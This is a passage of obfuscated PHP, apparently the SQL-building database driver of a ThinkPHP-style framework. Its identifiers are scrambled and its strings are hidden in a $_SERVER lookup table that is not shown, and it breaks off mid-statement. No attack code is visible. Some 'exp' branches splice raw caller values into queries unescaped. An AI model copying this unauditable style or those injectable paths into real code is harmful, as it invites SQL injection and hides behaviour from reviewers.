—õê[$ŸÎ÷×¦Á[17]][0]); return $this->connect($ôÈ‚‘Ï®, $ÅæŒ”ÎÑ); } public function parseDSN($³ÇŸĞ†) { $ë„¨­· =& $_SERVER[¼èá¯æÙ]; if (empty($³ÇŸĞ†)) { return !1; } $æ¼Í¾‹ = parse_url($³ÇŸĞ†); if ($æ¼Í¾‹[$ë„¨­·[217]]) { $ÂÔ§Õ—‹ = array($ë„¨­·[1043] => $æ¼Í¾‹[$ë„¨­·[217]], $ë„¨­·[970] => isset($æ¼Í¾‹[$ë„¨­·[676]]) ? $æ¼Í¾‹[$ë„¨­·[676]] : $ë„¨­·[12], $ë„¨­·[971] => isset($æ¼Í¾‹[$ë„¨­·[1067]]) ? $æ¼Í¾‹[$ë„¨­·[1067]] : $ë„¨­·[12], $ë„¨­·[968] => isset($æ¼Í¾‹[$ë„¨­·[218]]) ? $æ¼Í¾‹[$ë„¨­·[218]] : $ë„¨­·[12], $ë„¨­·[969] => isset($æ¼Í¾‹[$ë„¨­·[219]]) ? $æ¼Í¾‹[$ë„¨­·[219]] : $ë„¨­·[12], $ë„¨­·[21] => isset($æ¼Í¾‹[$ë„¨­·[97]]) ? substr($æ¼Í¾‹[$ë„¨­·[97]], 1) : $ë„¨­·[12]); } else { preg_match($ë„¨­·[1068], trim($³ÇŸĞ†), $×¾Ûé‰‹); $ÂÔ§Õ—‹ = array($ë„¨­·[1043] => $×¾Ûé‰‹[1], $ë„¨­·[970] => $×¾Ûé‰‹[2], $ë„¨­·[971] => $×¾Ûé‰‹[3], $ë„¨­·[968] => $×¾Ûé‰‹[4], $ë„¨­·[969] => $×¾Ûé‰‹[5], $ë„¨­·[21] => $×¾Ûé‰‹[6]); } $ÂÔ§Õ—‹[$ë„¨­·[998]] = $ë„¨­·[12]; return $ÂÔ§Õ—‹; } protected function debug() { $‰Ş·¢ =& $_SERVER[¼èá¯æÙ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $‰Ş·¢[1069]; if (think_config($‰Ş·¢[1070])) { think_status($‰Ş·¢[1071]); think_trace($this->queryStr . $‰Ş·¢[1072] . think_status($‰Ş·¢[24], $‰Ş·¢[1071], 6) . $‰Ş·¢[1073], $‰Ş·¢[12], $‰Ş·¢[1074]); } } protected function parseLock($™É½˜¾ó = false) { $ôøúëº¾ =& $_SERVER[¼èá¯æÙ]; if (!$™É½˜¾ó) { return $ôøúëº¾[12]; } if ($ôøúëº¾[1000] == $this->dbType) { return $ôøúëº¾[1075]; } return $ôøúëº¾[1076]; } protected function parseSet($¢ø¹²±£) { $ø¬¦ñ¾ =& $_SERVER[¼èá¯æÙ]; foreach ($¢ø¹²±£ as $À“àğØ => $İ–‡µçŸ) { if (is_array($İ–‡µçŸ) && $ø¬¦ñ¾[384] == $İ–‡µçŸ[0]) { $—ˆš‚”³[] = $this->parseKey($À“àğØ) . $ø¬¦ñ¾[517] . $İ–‡µçŸ[1]; } elseif (is_scalar($İ–‡µçŸ) || is_null($İ–‡µçŸ)) { $—ˆš‚”³[] = $this->parseKey($À“àğØ) . $ø¬¦ñ¾[517] . $this->parseValue($İ–‡µçŸ); } } return $ø¬¦ñ¾[1077] . implode($ø¬¦ñ¾[50], $—ˆš‚”³); } protected function bindParam($æåˆÛÔ¸, $œí›ª¥ï) { $this->bind[$_SERVER[¼èá¯æÙ][4] . $æåˆÛÔ¸] = $œí›ª¥ï; } protected function parseBind($˜îÌ‰£Í) { $˜îÌ‰£Í = array_merge($this->bind, $˜îÌ‰£Í); $this->bind = array(); return $˜îÌ‰£Í; } function parseKey(&$Õù”­±ˆ, $†êóÃŞ = true) { if ($†êóÃŞ) { $Õù”­±ˆ = $this->parseKeyCheck($Õù”­±ˆ); } return $Õù”­±ˆ; } function parseKeyCheck($ÙÙ¶Ş®¼) { $‚âã‘Õ» =& $_SERVER[¼èá¯æÙ]; $ÙÙ¶Ş®¼ = trim($ÙÙ¶Ş®¼); if (!preg_match($‚âã‘Õ»[1078], $ÙÙ¶Ş®¼)) { think_exception($‚âã‘Õ»[1079] . $ÙÙ¶Ş®¼); } return $ÙÙ¶Ş®¼; } protected function parseValue($œ«—øÁ) { $¤—ŸÑºø =& $_SERVER[¼èá¯æÙ]; if (is_string($œ«—øÁ)) { $œ«—øÁ = $¤—ŸÑºø[1039] . $this->escapeString($œ«—øÁ) . $¤—ŸÑºø[1039]; } elseif (isset($œ«—øÁ[0]) && is_string($œ«—øÁ[0]) && strtolower($œ«—øÁ[0]) == $¤—ŸÑºø[384]) { $œ«—øÁ = $this->escapeString($œ«—øÁ[1]); } elseif (is_array($œ«—øÁ)) { $œ«—øÁ = array_map(array($this, $¤—ŸÑºø[1040]), $œ«—øÁ); } elseif (is_bool($œ«—øÁ)) { $œ«—øÁ = $œ«—øÁ ? $¤—ŸÑºø[101] : $¤—ŸÑºø[240]; } elseif (is_null($œ«—øÁ)) { $œ«—øÁ = $¤—ŸÑºø[116]; } return $œ«—øÁ; } protected function parseField($óÃµ¸ä) { $šîŒ÷üÆ =& $_SERVER[¼èá¯æÙ]; if (is_string($óÃµ¸ä) && strpos($óÃµ¸ä, $šîŒ÷üÆ[50])) { $óÃµ¸ä = explode($šîŒ÷üÆ[50], $óÃµ¸ä); } if (is_array($óÃµ¸ä)) { $›ÑŠ•—ª = array(); foreach ($óÃµ¸ä as $³­—öê => $Úˆ²ÂÎ‘) { if (!is_numeric($³­—öê)) { $›ÑŠ•—ª[] = $this->parseKey($³­—öê, !1) . $šîŒ÷üÆ[1080] . $this->parseKey($Úˆ²ÂÎ‘); } else { $›ÑŠ•—ª[] = $this->parseKey($Úˆ²ÂÎ‘); } } $ÒœÃó²ö = implode($šîŒ÷üÆ[50], $›ÑŠ•—ª); } elseif (is_string($óÃµ¸ä) && !empty($óÃµ¸ä)) { $ÒœÃó²ö = $óÃµ¸ä; } else { $ÒœÃó²ö = $šîŒ÷üÆ[232]; } return $ÒœÃó²ö; } protected function parseTable($èÂóì×…) { $ôºÏ§Æ¨ =& $_SERVER[¼èá¯æÙ]; if (is_array($èÂóì×…)) { $ÂÔ¥¬Íî = array(); foreach ($èÂóì×… as $›‰¼ßéå => $™Üñ¸¢) { if (!is_numeric($›‰¼ßéå)) { $ÂÔ¥¬Íî[] = $this->parseKey($›‰¼ßéå) . $ôºÏ§Æ¨[53] . $this->parseKey($™Üñ¸¢); } else { $ÂÔ¥¬Íî[] = $this->parseKey($›‰¼ßéå); } } $èÂóì×… = $ÂÔ¥¬Íî; } elseif (is_string($èÂóì×…)) { if (strstr($èÂóì×…, $ôºÏ§Æ¨[53])) { return $èÂóì×…; } $èÂóì×… = explode($ôºÏ§Æ¨[50], $èÂóì×…); array_walk($èÂóì×…, array($this, $ôºÏ§Æ¨[988])); } return $ôºÏ§Æ¨[982] . trim(implode($ôºÏ§Æ¨[1081], $èÂóì×…), $ôºÏ§Æ¨[472]) . $ôºÏ§Æ¨[982]; } protected function parseWhere($‹Ü©ºäŞ) { $«Ô‚ÄÈ¥ =& $_SERVER[¼èá¯æÙ]; $•§¤…îå = $«Ô‚ÄÈ¥[12]; if (is_string($‹Ü©ºäŞ)) { $•§¤…îå = $‹Ü©ºäŞ; } else { $ğóäø = isset($‹Ü©ºäŞ[$«Ô‚ÄÈ¥[1082]]) ? strtoupper($‹Ü©ºäŞ[$«Ô‚ÄÈ¥[1082]]) : $«Ô‚ÄÈ¥[12]; if (in_array($ğóäø, array($«Ô‚ÄÈ¥[1083], $«Ô‚ÄÈ¥[1084], $«Ô‚ÄÈ¥[1085]))) { $ğóäø = $«Ô‚ÄÈ¥[53] . $ğóäø . $«Ô‚ÄÈ¥[53]; unset($‹Ü©ºäŞ[$«Ô‚ÄÈ¥[1082]]); } else { $ğóäø = $«Ô‚ÄÈ¥[1086]; } foreach ($‹Ü©ºäŞ as $ÊêÏ”‘Í => $áì©«ú ) { $•§¤…îå .= $«Ô‚ÄÈ¥[366]; if (is_numeric($ÊêÏ”‘Í)) { $ÊêÏ”‘Í = $«Ô‚ÄÈ¥[1087]; } if (0 === strpos($ÊêÏ”‘Í, $«Ô‚ÄÈ¥[11])) { $•§¤…îå .= $this->parseThinkWhere($ÊêÏ”‘Í, $áì©«ú ); } else { if (!preg_match($«Ô‚ÄÈ¥[1088], trim($ÊêÏ”‘Í))) { think_exception(think_lang($«Ô‚ÄÈ¥[1089]) . $«Ô‚ÄÈ¥[4] . $ÊêÏ”‘Í); } $±ê”×®ö = is_array($áì©«ú ) && isset($áì©«ú [$«Ô‚ÄÈ¥[1090]]); $ÊêÏ”‘Í = trim($ÊêÏ”‘Í); if (strpos($ÊêÏ”‘Í, $«Ô‚ÄÈ¥[224])) { $ÊÍ€­Í = explode($«Ô‚ÄÈ¥[224], $ÊêÏ”‘Í); $ÖŞ¸ÌßÍ = array(); foreach ($ÊÍ€­Í as $ñÅó¢°ß => $˜Ø½Ô¤å) { $üô’˜ê = $±ê”×®ö ? $áì©«ú [$ñÅó¢°ß] : $áì©«ú ; $ÖŞ¸ÌßÍ[] = $«Ô‚ÄÈ¥[349] . $this->parseWhereItem($this->parseKey($˜Ø½Ô¤å), $üô’˜ê) . $«Ô‚ÄÈ¥[987]; } $•§¤…îå .= implode($«Ô‚ÄÈ¥[1091], $ÖŞ¸ÌßÍ); } elseif (strpos($ÊêÏ”‘Í, $«Ô‚ÄÈ¥[296])) { $ÊÍ€­Í = explode($«Ô‚ÄÈ¥[296], $ÊêÏ”‘Í); $ÖŞ¸ÌßÍ = array(); foreach ($ÊÍ€­Í as $ñÅó¢°ß => $˜Ø½Ô¤å) { $üô’˜ê = $±ê”×®ö ? $áì©«ú [$ñÅó¢°ß] : $áì©«ú ; $ÖŞ¸ÌßÍ[] = $«Ô‚ÄÈ¥[349] . $this->parseWhereItem($this->parseKey($˜Ø½Ô¤å), $üô’˜ê) . $«Ô‚ÄÈ¥[987]; } $•§¤…îå .= implode($«Ô‚ÄÈ¥[1086], $ÖŞ¸ÌßÍ); } else { $•§¤…îå .= $this->parseWhereItem($this->parseKey($ÊêÏ”‘Í), $áì©«ú ); } } $•§¤…îå .= $«Ô‚ÄÈ¥[367] . $ğóäø; } $•§¤…îå = substr($•§¤…îå, 0, -strlen($ğóäø)); } return empty($•§¤…îå) ? $«Ô‚ÄÈ¥[12] : $«Ô‚ÄÈ¥[1092] . $•§¤…îå; } protected function parseWhereItem($Úü¹àÁ¢, $ˆ‡ßÍŒç) { $´ªÃÉš =& $_SERVER[¼èá¯æÙ]; $‡Š¢Êë® = $´ªÃÉš[12]; if (is_array($ˆ‡ßÍŒç)) { if (is_string($ˆ‡ßÍŒç[0])) { $ï¢çò© = strtolower($ˆ‡ßÍŒç[0]); if (in_array($ˆ‡ßÍŒç[0], array($´ªÃÉš[517], $´ªÃÉš[1093], $´ªÃÉš[1094], $´ªÃÉš[1095], $´ªÃÉš[1096], $´ªÃÉš[1097]))) { $‡Š¢Êë® .= $Úü¹àÁ¢ . $´ªÃÉš[53] . $ˆ‡ßÍŒç[0] . $´ªÃÉš[53] . $this->parseValue($ˆ‡ßÍŒç[1]); } elseif (preg_match($´ªÃÉš[1098], $ˆ‡ßÍŒç[0])) { $‡Š¢Êë® .= $Úü¹àÁ¢ . $´ªÃÉš[53] . $this->exp[$ï¢çò©] . $´ªÃÉš[53] . $this->parseValue($ˆ‡ßÍŒç[1]); } elseif (preg_match($´ªÃÉš[1099], $ˆ‡ßÍŒç[0])) { if (is_array($ˆ‡ßÍŒç[1])) { $È³™²ñ = isset($ˆ‡ßÍŒç[2]) ? strtoupper($ˆ‡ßÍŒç[2]) : $´ªÃÉš[1084]; if (in_array($È³™²ñ, array($´ªÃÉš[1083], $´ªÃÉš[1084], $´ªÃÉš[1085]))) { $¢ù„Ù°– = array(); foreach ($ˆ‡ßÍŒç[1] as $ıÂ¿ŒÀØ) { $¢ù„Ù°–[] = $Úü¹àÁ¢ . $´ªÃÉš[53] . $this->exp[$ï¢çò©] . $´ªÃÉš[53] . $this->parseValue($ıÂ¿ŒÀØ); } $‡Š¢Êë® .= $´ªÃÉš[349] . implode($´ªÃÉš[53] . $È³™²ñ . $´ªÃÉš[53], $¢ù„Ù°–) . $´ªÃÉš[987]; } } else { $‡Š¢Êë® .= $Úü¹àÁ¢ . $´ªÃÉš[53] . $this->exp[$ï¢çò©] . $´ªÃÉš[53] . $this->parseValue($ˆ‡ßÍŒç[1]); } } elseif ($´ªÃÉš[384] == $ï¢çò©) { $‡Š¢Êë® .= $´ªÃÉš[985] . $Úü¹àÁ¢ . $´ªÃÉš[53] . $ˆ‡ßÍŒç[1] . $´ªÃÉš[1100]; } elseif (preg_match($´ªÃÉš[1101], $ˆ‡ßÍŒç[0])) { $‡Š¢Êë® .= $ˆ‡ßÍŒç[0]; } elseif (preg_match($´ªÃÉš[1102], $ˆ‡ßÍŒç[0])) { if (isset($ˆ‡ßÍŒç[2]) && $´ªÃÉš[384] == $ˆ‡ßÍŒç[2]) { $‡Š¢Êë® .= $Úü¹àÁ¢ . $´ªÃÉš[53] . $this->exp[$ï¢çò©] . $´ªÃÉš[53] . $ˆ‡ßÍŒç[1]; } else { if (is_string($ˆ‡ßÍŒç[1])) { $ˆ‡ßÍŒç[1] = explode($´ªÃÉš[50], $ˆ‡ßÍŒç[1]); } $Œ¥À¶­• = implode($´ªÃÉš[50], $this->parseValue($ˆ‡ßÍŒç[1])); $‡Š¢Êë® .= $Úü¹àÁ¢ . $´ªÃÉš[53] . $this->exp[$ï¢çò©] . $´ªÃÉš[985] . $Œ¥À¶­• . $´ªÃÉš[987]; } } elseif (preg_match($´ªÃÉš[1103], $ˆ‡ßÍŒç[0])) { $³ôêƒ¬ü = is_string($ˆ‡ßÍŒç[1]) ? explode($´ªÃÉš[50], $ˆ‡ßÍŒç[1]) : $ˆ‡ßÍŒç[1]; $‡Š¢Êë® .= $´ªÃÉš[985] . $Úü¹àÁ¢ . $´ªÃÉš[53] . $this->exp[$ï¢çò©] . $´ªÃÉš[53] . $this->parseValue($³ôêƒ¬ü[0]) . $´ªÃÉš[1086] . $this->parseValue($³ôêƒ¬ü[1]) . $´ªÃÉš[367]; } else { think_exception(think_lang($´ªÃÉš[1089]) . $´ªÃÉš[4] . $ˆ‡ßÍŒç[0]); } } else { $¹šÛÀ×® = count($ˆ‡ßÍŒç); $ä¶‚Ã“ = $´ªÃÉš[12]; if (is_string($ˆ‡ßÍŒç[$¹šÛÀ×® - 1])) { $ä¶‚Ã“ = isset($ˆ‡ßÍŒç[$¹šÛÀ×® - 1]) ? strtoupper($ˆ‡ßÍŒç[$¹šÛÀ×® - 1]) : $´ªÃÉš[12]; if (in_array($ä¶‚Ã“, array($´ªÃÉš[1083], $´ªÃÉš[1084], $´ªÃÉš[1085]))) { $¹šÛÀ×® = $¹šÛÀ×® - 1; } } else { $ä¶‚Ã“ = $´ªÃÉš[1083]; } for ($á’µì¾© = 0; $á’µì¾© < $¹šÛÀ×®; $á’µì¾©++) { $³ôêƒ¬ü = is_array($ˆ‡ßÍŒç[$á’µì¾©]) ? $ˆ‡ßÍŒç[$á’µì¾©][1] : $ˆ‡ßÍŒç[$á’µì¾©]; if ($´ªÃÉš[384] == strtolower($ˆ‡ßÍŒç[$á’µì¾©][0])) { $‡Š¢Êë® .= $´ªÃÉš[349] . $Úü¹àÁ¢ . $´ªÃÉš[53] . $³ôêƒ¬ü . $´ªÃÉš[1100] . $ä¶‚Ã“ . $´ªÃÉš[53]; } else { $ÈÃÀ¦Æ– = is_array($ˆ‡ßÍŒç[$á’µì¾©]) ? $this->exp[strtolower($ˆ‡ßÍŒç[$á’µì¾©][0])] : $´ªÃÉš[517]; if (!$ÈÃÀ¦Æ– && is_array($ˆ‡ßÍŒç[$á’µì¾©]) && in_array($ˆ‡ßÍŒç[$á’µì¾©][0], array($´ªÃÉš[517], $´ªÃÉš[1093], $´ªÃÉš[1094], $´ªÃÉš[1095], $´ªÃÉš[1096], $´ªÃÉš[1097]))) { $ÈÃÀ¦Æ– = $ˆ‡ßÍŒç[$á’µì¾©][0]; } $‡Š¢Êë® .= $´ªÃÉš[349] . $Úü¹àÁ¢ . $´ªÃÉš[53] . $ÈÃÀ¦Æ– . $´ªÃÉš[53] . $this->parseValue($³ôêƒ¬ü) . $´ªÃÉš[1100] . $ä¶‚Ã“ . $´ªÃÉš[53]; } } $‡Š¢Êë® = substr($‡Š¢Êë®, 0, -4); } } else { $‡Š¢Êë® .= $Úü¹àÁ¢ . $´ªÃÉš[1104] . $this->parseValue($ˆ‡ßÍŒç); } return $‡Š¢Êë®; } protected function parseThinkWhere($§¸€Æñí, $à‘ıÄÂ) { $³ÒÍÀü =& $_SERVER[¼èá¯æÙ]; $¼·Ïàğî = $³ÒÍÀü[12]; switch ($§¸€Æñí) { case $³ÒÍÀü[439]: $¼·Ïàğî = $à‘ıÄÂ; break; case $³ÒÍÀü[1087]: $¼·Ïàğî = is_string($à‘ıÄÂ) ? $à‘ıÄÂ : substr($this->parseWhere($à‘ıÄÂ), 6); break; case $³ÒÍÀü[1105]: parse_str($à‘ıÄÂ, $ö† Ò¤›); if (isset($ö† Ò¤›[$³ÒÍÀü[1082]])) { $îĞ¼Ï¦³ = $³ÒÍÀü[53] . strtoupper($ö† Ò¤›[$³ÒÍÀü[1082]]) . $³ÒÍÀü[53]; unset($ö† Ò¤›[$³ÒÍÀü[1082]]); } else { $îĞ¼Ï¦³ = $³ÒÍÀü[1086]; } $†°“÷² = array(); foreach ($ö† Ò¤› as $êœ¢ß¢­ => $ßÀ§ì›”) { $†°“÷²[] = $this->parseKey($êœ¢ß¢­) . $³ÒÍÀü[1104] . $this->parseValue($ßÀ§ì›”); } $¼·Ïàğî = implode($îĞ¼Ï¦³, $†°“÷²); break; } return $¼·Ïàğî; } protected function parseLimit($£Ï¹ÜÂ) { $¦ªğ›Èƒ =& $_SERVER[¼èá¯æÙ]; return !empty($£Ï¹ÜÂ) ? $¦ªğ›Èƒ[51] . $£Ï¹ÜÂ . $¦ªğ›Èƒ[53] : $¦ªğ›Èƒ[12]; } protected function parseJoin($ïÍ¦²¤) { $Ç©ÜËÆÁ =& $_SERVER[¼èá¯æÙ]; $¿Ş¶Ã = $Ç©ÜËÆÁ[12]; if (!empty($ïÍ¦²¤)) { if (is_array($ïÍ¦²¤)) { foreach ($ïÍ¦²¤ as $€Á´¸ÜÊ => $Ò‡Ÿ•ÇÇ) { if (!1 !== stripos($Ò‡Ÿ•ÇÇ, $Ç©ÜËÆÁ[1106])) { $¿Ş¶Ã .= $Ç©ÜËÆÁ[53] . $Ò‡Ÿ•ÇÇ; } else { $¿Ş¶Ã .= $Ç©ÜËÆÁ[1107] . $Ò‡Ÿ•ÇÇ; } } } else { $¿Ş¶Ã .= $Ç©ÜËÆÁ[1107] . $ïÍ¦²¤; } } $¿Ş¶Ã = preg_replace($Ç©ÜËÆÁ[1108], think_config($Ç©ÜËÆÁ[1012]) . $Ç©ÜËÆÁ[1109], $¿Ş¶Ã); return $¿Ş¶Ã; } protected function parseOrder($Ãû–®ˆ³) { $òÆŞèŞĞ =& $_SERVER[¼èá¯æÙ]; if (is_array($Ãû–®ˆ³)) { $¦ÂäãÂ = array(); foreach ($Ãû–®ˆ³ as $íÏÌ¤µŠ => $é¾µ¶‚û) { if (is_numeric($íÏÌ¤µŠ)) { $¦ÂäãÂ[] = $this->parseKey($é¾µ¶‚û); } else { $é¾µ¶‚û = in_array(strtoupper(trim($é¾µ¶‚û)), array($òÆŞèŞĞ[1110], $òÆŞèŞĞ[1111])) ? $òÆŞèŞĞ[53] . $é¾µ¶‚û : $òÆŞèŞĞ[12]; if (preg_match($òÆŞèŞĞ[1112], $íÏÌ¤µŠ)) { $¦ÂäãÂ[] = $this->parseKey($íÏÌ¤µŠ) . $é¾µ¶‚û; } else { think_exception($òÆŞèŞĞ[1113] . $íÏÌ¤µŠ); } } } $Ãû–®ˆ³ = implode($òÆŞèŞĞ[50], $¦ÂäãÂ); } return !empty($Ãû–®ˆ³) ? $òÆŞèŞĞ[1114] . $Ãû–®ˆ³ : $òÆŞèŞĞ[12]; } protected function parseGroup($£üŒŠ¸µ) { $¶¶Ÿ‹¥ì =& $_SERVER[¼èá¯æÙ]; return !empty($£üŒŠ¸µ) ? $¶¶Ÿ‹¥ì[1115] . $£üŒŠ¸µ : $¶¶Ÿ‹¥ì[12]; } protected function parseHaving($Ä˜Í´‡¬) { $µışöéİ =& $_SERVER[¼èá¯æÙ]; return !empty($Ä˜Í´‡¬) ? $µışöéİ[1116] . $Ä˜Í´‡¬ : $µışöéİ[12]; } protected function parseComment($ê¾ô»½¸) { $ïÈÚÀÁ  =& $_SERVER[¼èá¯æÙ]; return !empty($ê¾ô»½¸) ? $ïÈÚÀÁ [1117] . $ê¾ô»½¸ . $ïÈÚÀÁ [1118] : $ïÈÚÀÁ [12]; } protected function parseDistinct($°àÍÛ£ô) { $Å¶ËÀ­ñ =& $_SERVER[¼èá¯æÙ]; return !empty($°àÍÛ£ô) ? $Å¶ËÀ­ñ[1119] : $Å¶ËÀ­ñ[12]; } protected function parseUnion($™Öúñ²›) { $Ì²ïİáØ =& $_SERVER[¼èá¯æÙ]; if (empty($™Öúñ²›)) { return $Ì²ïİáØ[12]; } if (isset($™Öúñ²›[$Ì²ïİáØ[435]])) { $áİˆ±¥Á = $Ì²ïİáØ[1120]; unset($™Öúñ²›[$Ì²ïİáØ[435]]); } else { $áİˆ±¥Á = $Ì²ïİáØ[1121]; } foreach ($™Öúñ²› as $Éí¬´Ş) { $Æ¡¥ø[] = $áİˆ±¥Á . (is_array($Éí¬´Ş) ? $this->buildSelectSql($Éí¬´Ş) : $Éí¬´Ş); } return implode($Ì²ïİáØ[53], $Æ¡¥ø); } public function insert($ÜéàíËĞ, $îÀæığÊ = array(), $­Û€—ˆ = false) { $Å¬À¥äñ =& $_SERVER[¼èá¯æÙ]; $åÜæÑ£Û = $×Ó´°ê÷ = array(); $this->model = $îÀæığÊ[$Å¬À¥äñ[370]]; foreach ($ÜéàíËĞ as $è¶‡ÔÖÉ => $ñ‰¨œ©¿) { if (is_array($ñ‰¨œ©¿) && $Å¬À¥äñ[384] == $ñ‰¨œ©¿[0]) { $×Ó´°ê÷[] = $this->parseKey($è¶‡ÔÖÉ); $åÜæÑ£Û[] = $ñ‰¨œ©¿[1]; } elseif (is_scalar($ñ‰¨œ©¿) || is_null($ñ‰¨œ©¿)) { $×Ó´°ê÷[] = $this->parseKey($è¶‡ÔÖÉ); $åÜæÑ£Û[] = $this->parseValue($ñ‰¨œ©¿); } } $è•ïè¿à = ($­Û€—ˆ ? $Å¬À¥äñ[989] : $Å¬À¥äñ[990]) . $Å¬À¥äñ[991] . $this->parseTable($îÀæığÊ[$Å¬À¥äñ[368]]) . $Å¬À¥äñ[985] . implode($Å¬À¥äñ[50], $×Ó´°ê÷) . $Å¬À¥äñ[986] . implode($Å¬À¥äñ[50], $åÜæÑ£Û) . $Å¬À¥äñ[987]; $è•ïè¿à .= $this->parseLock(isset($îÀæığÊ[$Å¬À¥äñ[926]]) ? $îÀæığÊ[$Å¬À¥äñ[926]] : !1); $è•ïè¿à .= $this->parseComment(!empty($îÀæığÊ[$Å¬À¥äñ[441]]) ? $îÀæığÊ[$Å¬À¥äñ[441]] : $Å¬À¥äñ[12]); return $this->execute($è•ïè¿à, $this->parseBind(!empty($îÀæığÊ[$Å¬À¥äñ[372]]) ? $îÀæığÊ[$Å¬À¥äñ[372]] : array())); } public function selectInsert($ì€ƒ–û, $÷ûçÈÊ’, $š¬”‘„ = array()) { $ø°íÇº´ =& $_SERVER[¼èá¯æÙ]; $this->model = $š¬”‘„[$ø°íÇº´[370]]; if (is_string($ì€ƒ–û)) { $ì€ƒ–û = explode($ø°íÇº´[50], $ì€ƒ–û); } array_walk($ì€ƒ–û, array($this, $ø°íÇº´[988])); $æïˆáÙÜ = $ø°íÇº´[1122] . $this->parseTable($÷ûçÈÊ’) . $ø°íÇº´[985] . implode($ø°íÇº´[50], $ì€ƒ–û) . $ø°íÇº´[1100]; $æïˆáÙÜ .= $this->buildSelectSql($š¬”‘„); return $this->execute($æïˆáÙÜ, $this->parseBind(!empty($š¬”‘„[$ø°íÇº´[372]]) ? $š¬”‘„[$ø°íÇº´[372]] : array())); } public function update($ÅÍ½°š¹, $šñ¿íñ) { $Ñƒ‚ÑÁ =& $_SERVER[¼èá¯æÙ]; $this->model = $šñ¿íñ[$Ñƒ‚ÑÁ[370]]; $Ë¶–Õµ = $Ñƒ‚ÑÁ[1123] . $this->parseTable($šñ¿íñ[$Ñƒ‚ÑÁ[368]]) . $this->parseSet($ÅÍ½°š¹) . $this->parseWhere(!empty($šñ¿íñ[$Ñƒ‚ÑÁ[364]]) ? $šñ¿íñ[$Ñƒ‚ÑÁ[364]] : $Ñƒ‚ÑÁ[12]) . $this->parseOrder(!empty($šñ¿íñ[$Ñƒ‚ÑÁ[453]]) ? $šñ¿íñ[$Ñƒ‚ÑÁ[453]] : $Ñƒ‚ÑÁ[12]) . $this->parseLimit(!empty($šñ¿íñ[$Ñƒ‚ÑÁ[379]]) ? $šñ¿íñ[$Ñƒ‚ÑÁ[379]] : $Ñƒ‚ÑÁ[12]) . $this->parseLock(isset($šñ¿íñ[$Ñƒ‚ÑÁ[926]]) ? $šñ¿íñ[$Ñƒ‚ÑÁ[926]] : !1) . $this->parseComment(!empty($šñ¿íñ[$Ñƒ‚ÑÁ[441]]) ? $šñ¿íñ[$Ñƒ‚ÑÁ[441]] : $Ñƒ‚ÑÁ[12]); return $this->execute($Ë¶–Õµ, $this->parseBind(!empty($šñ¿íñ[$Ñƒ‚ÑÁ[372]]) ? $šñ¿íñ[$Ñƒ‚ÑÁ[372]] : array())); } public function delete($¯ŒÏÅÙæ = array()) { $íâÊáÄ¥ =& $_SERVER[¼èá¯æÙ]; $this->model = $¯ŒÏÅÙæ[$íâÊáÄ¥[370]]; $­Ñ„›±ˆ = $íâÊáÄ¥[1124] . $this->parseTable($¯ŒÏÅÙæ[$íâÊáÄ¥[368]]) . $this->parseWhere(!empty($¯ŒÏÅÙæ[$íâÊáÄ¥[364]]) ? $¯ŒÏÅÙæ[$íâÊáÄ¥[364]] : $íâÊáÄ¥[12]) . $this->parseOrder(!empty($¯ŒÏÅÙæ[$íâÊáÄ¥[453]]) ? $¯ŒÏÅÙæ[$íâÊáÄ¥[453]] : $íâÊáÄ¥[12]) . $this->parseLimit(!empty($¯ŒÏÅÙæ[$íâÊáÄ¥[379]]) ? $¯ŒÏÅÙæ[$íâÊáÄ¥[379]] : $íâÊáÄ¥[12]) . $this->parseLock(isset($¯ŒÏÅÙæ[$íâÊáÄ¥[926]]) ? $¯ŒÏÅÙæ[$íâÊáÄ¥[926]] : !1) . $this->parseComment(!empty($¯ŒÏÅÙæ[$íâÊáÄ¥[441]]) ? $¯ŒÏÅÙæ[$íâÊáÄ¥[441]] : $íâÊáÄ¥[12]); return $this->execute($­Ñ„›±ˆ, $this->parseBind(!empty($¯ŒÏÅÙæ[$íâÊáÄ¥[372]]) ? $¯ŒÏÅÙæ[$íâÊáÄ¥[372]] : array())); } public function select($ÈÜ—çŠû = array()) { $“ŞãÁ™´ =& $_SERVER[¼èá¯æÙ]; $this->model = $ÈÜ—çŠû[$“ŞãÁ™´[370]]; $Õ±Â»èı = $this->buildSelectSql($ÈÜ—çŠû); $´ š’ßÙ = isset($ÈÜ—çŠû[$“ŞãÁ™´[436]]) ? $ÈÜ—çŠû[$“ŞãÁ™´[436]] : !1; if ($´ š’ßÙ) { $Ó‚­ğ¢õ = is_string($´ š’ßÙ[$“ŞãÁ™´[107]]) ? $´ š’ßÙ[$“ŞãÁ™´[107]] : $“ŞãÁ™´[1125] . md5($Õ±Â»èı); $éªöšò½ = think_cache($Ó‚­ğ¢õ, $“ŞãÁ™´[12], $´ š’ßÙ); if (!1 !== $éªöšò½) { return $éªöšò½; } } $èÈôÖ¶¤ = $this->query($Õ±Â»èı, $this->parseBind(!empty($ÈÜ—çŠû[$“ŞãÁ™´[372]]) ? $ÈÜ—çŠû[$“ŞãÁ™´[372]] : array())); if ($´ š’ßÙ && !1 !== $èÈôÖ¶¤) { think_cache($Ó‚­ğ¢õ, $èÈôÖ¶¤, $´ š’ßÙ); } return $èÈôÖ¶¤; } public function buildSelectSql($ğÉêªÚ¤ = array()) { $æ¶Îò„Ó =& $_SERVER[¼èá¯æÙ]; if (isset($ğÉêªÚ¤[$æ¶Îò„Ó[440]])) { if (strpos($ğÉêªÚ¤[$æ¶Îò„Ó[440]], $æ¶Îò„Ó[50])) { list($ÍÈæ‘Ş”, $İ ğüµ) = explode($æ¶Îò„Ó[50], $ğÉêªÚ¤[$æ¶Îò„Ó[440]]); } else { $ÍÈæ‘Ş” = $ğÉêªÚ¤[$æ¶Îò„Ó[440]]; } $ÍÈæ‘Ş” = $ÍÈæ‘Ş” ? $ÍÈæ‘Ş” : 1; $İ ğüµ = isset($İ ğüµ) ? $İ ğüµ : (is_numeric($ğÉêªÚ¤[$æ¶Îò„Ó[379]]) ? $ğÉêªÚ¤[$æ¶Îò„Ó[379]] : 20); $Å£ºñ®Å = $İ ğüµ * ((int) $ÍÈæ‘Ş” - 1); $ğÉêªÚ¤[$æ¶Îò„Ó[379]] = $Å£ºñ®Å . $æ¶Îò„Ó[50] . $İ ğüµ; } if (think_config($æ¶Îò„Ó[1126])) { $˜»×˜Ô = $æ¶Îò„Ó[1127] . md5(serialize($ğÉêªÚ¤)); $î™½·È‚ = think_cache($˜»×˜Ô); if ($î™½·È‚) { return $î™½·È‚; } } $Ü•‰Íò = $this->parseSql($this->selectSql, $ğÉêªÚ¤); $Ü•‰Íò .= 